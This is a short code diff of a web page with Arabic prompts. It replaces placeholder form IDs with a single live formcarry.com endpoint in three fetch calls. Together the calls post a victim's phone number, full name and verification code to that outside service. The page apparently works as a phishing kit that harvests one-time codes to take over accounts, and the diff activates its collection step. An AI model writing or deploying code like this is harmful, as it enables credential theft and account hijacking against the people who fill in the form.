@@ -63,7 +63,7 @@
       const phone = document.getElementById('phone').value;
       if (!phone) return alert("يرجى إدخال رقم الهاتف");
 
-      fetch("https://formcarry.com/s/FORM_ID_1", {
+      fetch("https://formcarry.com/s/pHHZOWhpgsB", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ phone })
@@ -86,7 +86,7 @@
 
       if (!fullname || !code) return alert("يرجى إدخال الاسم ورمز التحقق");
 
-      fetch("https://formcarry.com/s/FORM_ID_2", {
+      fetch("https://formcarry.com/s/pHHZOWhpgsB", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ fullname, code })
@@ -102,7 +102,7 @@
       const fullname = document.getElementById('fullname').value;
       const code = document.getElementById('code').value;
 
-      fetch("https://formcarry.com/s/FORM_ID_3", {
+      fetch("https://formcarry.com/s/pHHZOWhpgsB", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ phone, fullname, code })
